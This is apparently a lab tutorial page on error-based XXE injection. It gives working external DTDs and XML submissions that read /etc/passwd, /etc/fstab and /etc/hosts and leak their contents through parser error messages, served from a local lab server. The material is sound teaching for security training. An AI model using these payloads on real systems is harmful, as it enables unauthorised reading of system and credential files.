---
title: "Error Based XXE"
weight: 10
---

If we are not able to send data with new line characters, we still may be able to view the contents by exploiting XML parsing errors. In the first exercise we will cause an error by trying to read a non-existent file.

## Path-based XML Parsing Error

The file `/home/vagrant/dtds/path_error.dtd` should contain the following DTD. Notice how we are first grabbing the contents of the passwd file. We will then try to use the contents of that file as the input for a file path.

DTD File for a path-based parsing error:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Submit the following:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://localhost:5000/path_error.dtd">
    %ext;
]>
<message></message>
```
Using the error we can see the contents of the file:

![](/static/img/path_error_xxe.png)

## Protocol-based XML Parsing Error

In addition to the non-existent path error used above, we can also use a protocol error to view the content. In this exercise we will trigger the error by not including a protocol: `:%file;`. This dtd file is found here: `/home/vagrant/dtds/protocol_error.dtd`. Instead of the passwd file, lets mix it up and grab the `/etc/fstab` file.

``` xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

Submit the following:

``` xml
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/protocol_error.dtd" >
  %ext;
  %ent;
]>

<data>&data;</data>
```

Unfortunately it did not work, why?

![](/static/img/invalid_argument.png)

Lets see the file:

```plaintext
# <device		mount point	file system type	options
LABEL=cloudimg-rootfs	/	 ext4	defaults	0 0
```

If you guessed that the error is caused because of the `<` in the file. You would be right! To double-check, lets submit the same stuff, but this time we will grab the `/etc/hosts` file. We will use the dtd file found here: `/home/vagrant/dtds/protocol_error2.dtd`.

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

Submit the following:

``` xml
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/protocol_error2.dtd" >
  %ext;
  %ent;
]>

<data>&data;</data>
```

![](/static/img/protocol_error_hosts.png)

This means that the error we received earlier was caused by the content of the file and not anything we did wrong. In the next chapter we will see how to get around this issue.
